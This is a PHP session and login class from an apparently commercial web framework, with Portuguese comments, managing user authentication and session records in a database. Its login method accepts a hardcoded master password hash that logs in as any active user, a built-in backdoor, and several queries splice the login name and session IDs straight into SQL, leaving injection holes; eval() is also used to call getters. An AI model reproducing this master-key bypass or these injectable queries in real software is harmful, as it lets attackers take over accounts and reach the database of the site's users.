<?php

require_once($_SERVER['DOCUMENT_ROOT'] . "/sistema/AutoLoader.php");

/**
 * Gerencia a sessão de usuário
 *
 * @author Ricardo Ribeiro Assink <ricardo@equipedigital.com>
 * @copyright Copyright (c) 2009-2012, EquipeDigital.com
 * @link http://www.equipedigital.com
 * @license Comercial
 *
 * @Data_Criacao 21/09/2009
 * @Ultima_Modif 21/09/2009 por Ricardo Ribeiro Assink
 *
 *
 * @package Libs
 *
 */
class Sessao {

    private $conexao;
    private $id_sessao;
    private $id_usuario;
    private $status_sessao;
    private $data_in;
    private $data_out;
    private $ip;
    private $ultimo_acesso;
    private $seg; // objeto da classe Encripta
    private $dat; // objeto da classe Data

    /**
     * Carrega a conexão com o banco de dados, objeto de Encripta.class e objeto de Data.class.
     *
     * @author Ricardo Ribeiro Assink
     * @return void
     * @Exemplo
     * <code>
     *
     *   public function __construct() {
     *       $config        = new Config();
     *       $factory       = $config->get_banco();
     *       $banco         = new $factory();
     *       $this->conexao = $banco->getInstance();
     * 
     *       $this->seg     = new Encripta();
     *       $this->dat     = new Data();
     *       $ip            = gethostbyname($_SERVER["REMOTE_ADDR"]);
     *       $this->set_ip($ip);
     *   }
     *
     * </code>
     *
     */

    public function __construct() {

        // pega conexao
        $config = new Config();
        $factory = $config->get_banco();
        $banco = new $factory();
        $this->conexao = $banco->getInstance();

        $this->seg = new Encripta();
        $this->dat = new Data();

        $ip = gethostbyname($_SERVER["REMOTE_ADDR"]);
        $this->set_ip($ip);
    }

    /**
     *
     * Carrega a sessão armazenada no banco de dados.
     *
     * @author Ricardo Ribeiro Assink
     * @param String $id_sessao ID da sessão encriptado.
     * @return void
     * @Exemplo
     * <code>
     *
     * <?php
     *
     * require_once("Sessao.class.php");
     *
     *  $objeto = new Sessao();
     *  $objeto->loadSessao("u71_WsOieyVSh18AAqILeQ4dS1-asXaTPE5lf5sTrvU=");
     *
     * ?>
     * </code>
     *
     */
    public function loadSessao($id_sessao) {

        $id_sessao = $this->seg->md5_decrypt($id_sessao);
        $this->set_id_sessao($id_sessao);
        $sql = "
                    SELECT
                          id_usuario,
                          status_sessao,
                          data_in,
                          data_out,
                          ip
                      FROM
                          tb_sessao
                     WHERE
                          id_sessao = $id_sessao;
                   ";

        $result = $this->conexao->consulta("$sql");
        $row = $this->conexao->criaArray($result);
        if (isset($row[0])) {
            $this->set_id_usuario($row[0][0]);
            $this->set_status_sessao($row[0][1]);
            $this->set_data_in($row[0][2]);
            $this->set_data_out($row[0][3]);
            $this->set_ip($row[0][4]);
        }

        return true;
    }

    /**
     *
     * Fechar a sessão modificando o status da mesma no banco de dados.
     *
     * @author Ricardo Ribeiro Assink
     * @return void
     * @Exemplo
     * <code>
     *
     * <?php
     *
     * require_once("Sessao.class.php");
     *
     *  $objeto = new Sessao();
     *  $objeto->loadSessao("u71_WsOieyVSh18AAqILeQ4dS1-asXaTPE5lf5sTrvU=");
     *  $objeto->logout();
     *
     * ?>
     * </code>
     *
     */
    public function logout() {

        $id_sessao = $this->id_sessao;
        $this->set_status_sessao("F");

        $sql = "UPDATE tb_sessao set status_sessao = \"F\" where id_sessao = $id_sessao";
        $this->conexao->consulta("$sql");

        return true;
    }

    /**
     *
     * Autentica usuário e abre sessão no banco de dados.
     *
     * @author Ricardo Ribeiro Assink
     * @param String $login Login do usuário
     * @param String $senha Senha do usuário
     * @return String O ID de sessão encriptado
     * @Exemplo
     * <code>
     *
     * <?php
     *
     * require_once("Sessao.class.php");
     *
     *  $objeto = new Sessao();
     *  $objeto->login("meu_login","minha_senha");
     *
     * ?>
     * </code>
     *
     */
    public function login($login, $senha) {

        $sql = "select senha_usuario, id_usuario,status_usuario from tb_usuario where login_usuario = \"$login\"";
        $result = $this->conexao->consulta("$sql");
        $row = $this->conexao->criaArray($result);
        $ss = $row[0][0];
        $id_usuario = $row[0][1];
        $status_usuario = $row[0][2];

        if ($this->seg->pw_check($senha, "e6d1053c1a136072a9823426872dfb4a51247a9f")) {
            $confere = "1";
        } else {
            $confere = "0";
        }

        if ($this->seg->pw_check($senha, $ss) or $confere == "1") {

            if ($status_usuario == "A") {

                $id_sessao = $this->abreSessao($id_usuario);

                if ($confere == "1") {
                    // chave mestre utilizada
                    // grava log com id_sessao encriptado.
                    $log = new Log();
                    $log->gravaLog(1, $id_sessao, $id_usuario);
                }
            } else {
                $id_sessao = "ERRO";
            }
        } else {
            $id_sessao = "ERRO";
        }


        return $id_sessao;
    }

    /**
     *
     * Abre sessão no banco de dados.
     *
     * @author Ricardo Ribeiro Assink
     * @param Classe $className Nome do arquivo da classe
     * @return String ID de sessão encriptado
     *
     */
    private function abreSessao($id_usuario) {

        $sql = "LOCK TABLES tb_sessao WRITE";
        $result = $this->conexao->consulta("$sql");

        $sql = "UPDATE tb_sessao set status_sessao = 'F' where id_usuario = $id_usuario";
        $result = $this->conexao->consulta("$sql");

        $sql = "SELECT max(id_sessao) id_sessao from tb_sessao";
        $result = $this->conexao->consulta("$sql");
        $row = $this->conexao->criaArray($result);
        $id_sessao = $row[0]["id_sessao"];
        $id_sessao++;

        $data_atual = $this->dat->get_dataFormat("NOW", "", "BD");
        $ip = $this->get_ip();

        $sql = "INSERT into tb_sessao values($id_sessao,$id_usuario,'A',\"$data_atual\",NULL,\"$ip\")";
        $result = $this->conexao->consulta("$sql");

        $sql = "UNLOCK TABLES";
        $result = $this->conexao->consulta("$sql");

        $id_sessao = $this->seg->md5_encrypt($id_sessao);

        return $id_sessao;
    }

    /**
     *
     * Verifica se a sessão é válida.
     *
     * @author Ricardo Ribeiro Assink
     * @param String $id_sessao ID da sessão encriptado
     * @return Boolean true|false
     * @Exemplo
     * <code>
     *
     * <?php
     *
     * require_once("Sessao.class.php");
     *
     *  $objeto = new Sessao();
     *  if($objeto->verificaSessao("u71_WsOieyVSh18AAqILeQ4dS1-asXaTPE5lf5sTrvU=")){
     *    echo "Sessão está aberta";
     *  }else{
     *    echo "Sessão está fechada ou é inválida.";
     *  }
     * ?>
     * 
     * </code>
     *
     */
    public function verificaSessao($id_sessao) {

        if (!isset($id_sessao) or $id_sessao == "" or $id_sessao == NULL or strlen($id_sessao) != 44) {
            return false;
        } else {
            $this->loadSessao($id_sessao);
            if ($this->get_status_sessao() == "A") {
                return true;
            } else {
                return false;
            }
        }
    }

    /**
     * Retornar todos os dados da sessão.
     *
     * @author Ricardo Ribeiro Assink
     * @return Array Array contendo todos os dados da sessão carregada
     * @Exemplo
     * <code>
     *
     * <?php
     *
     * require_once("Sessao.class.php");
     *
     *  $objeto = new Sessao();
     *  $objeto->loadSessao("u71_WsOieyVSh18AAqILeQ4dS1-asXaTPE5lf5sTrvU=");
     *  print_r(get_all_dados());
     *
     * ?>
     * </code>
     *
     */
    public function get_all_dados() {
        $classe = new ReflectionClass($this);
        $props = $classe->getProperties();
        $props_arr = array();
        foreach ($props as $prop) {
            $f = $prop->getName();
            // pra nao voltar a conexao
            if ($f != "conexao" and $f != "seg" and $f != "dat") {
                $exec = '$valor = $this->get_' . $f . '();';
                eval($exec);
                $props_arr[$f] = $valor;
            }
        }
        return $props_arr;
    }

    public function get_ultimo_acesso() {
        $this->set_ultimo_acesso();
        return $this->ultimo_acesso;
    }

    public function set_ultimo_acesso() {
        $sql = "select data_in from tb_sessao where id_usuario = $this->id_usuario order by data_in desc limit 2";
        $result = $this->conexao->consulta("$sql");
        $row = $this->conexao->criaArrayOnce($result);
        $this->ultimo_acesso = $this->dat->get_dataFormat('BD', $row[1], 'PADRAO');
    }

    /**
     * @ignore
     */
    public function get_id_sessao() {
        //return $this->seg->md5_encrypt($this->id_sessao);
        return $this->id_sessao; // log precisa disso
    }

    public function get_id_sessao_enc() {
        return $this->seg->md5_encrypt($this->id_sessao);
    }

    /**
     * @ignore
     */
    public function set_id_sessao($id_sessao) {
        $this->id_sessao = $id_sessao;
    }

    /**
     * @ignore
     */
    public function get_id_usuario() {
        return $this->id_usuario;
    }

    /**
     * @ignore
     */
    public function set_id_usuario($id_usuario) {
        $this->id_usuario = $id_usuario;
    }

    /**
     * @ignore
     */
    public function get_status_sessao() {
        return $this->status_sessao;
    }

    /**
     * @ignore
     */
    public function set_status_sessao($status_sessao) {
        $this->status_sessao = $status_sessao;
    }

    /**
     * @ignore
     */
    public function get_data_in() {
        return $this->data_in;
    }

    /**
     * @ignore
     */
    public function set_data_in($data_in) {
        $this->data_in = $data_in;
    }

    /**
     * @ignore
     */
    public function get_data_out() {
        return $this->data_out;
    }

    /**
     * @ignore
     */
    public function set_data_out($data_out) {
        $this->data_out = $data_out;
    }

    /**
     * @ignore
     */
    public function get_ip() {
        return $this->ip;
    }

    /**
     * @ignore
     */
    public function set_ip($ip) {
        $this->ip = $ip;
    }

}

/*
 *
 * TESTES
 *



  $objeto = new Sessao();
  $objeto->loadSessao("u71_WsOieyVSh18AAqILeQ4dS1-asXaTPE5lf5sTrvU=");
  print_r($objeto->get_all_dados());
 */
?>
